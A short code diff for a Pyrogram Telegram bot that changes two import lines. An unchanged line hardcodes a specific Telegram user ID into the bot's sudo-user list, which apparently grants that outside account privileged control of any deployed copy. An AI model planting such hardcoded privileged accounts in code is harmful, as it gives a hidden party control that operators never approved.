@@ -2,8 +2,8 @@
 from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
-from Deadly.config import SUDO_USERS
-from Deadly.helper.admins import get_administrators
+from Deadly import SUDO_USERS
+from .admins import get_administrators
 
 
 SUDO_USERS.append(5937170640)
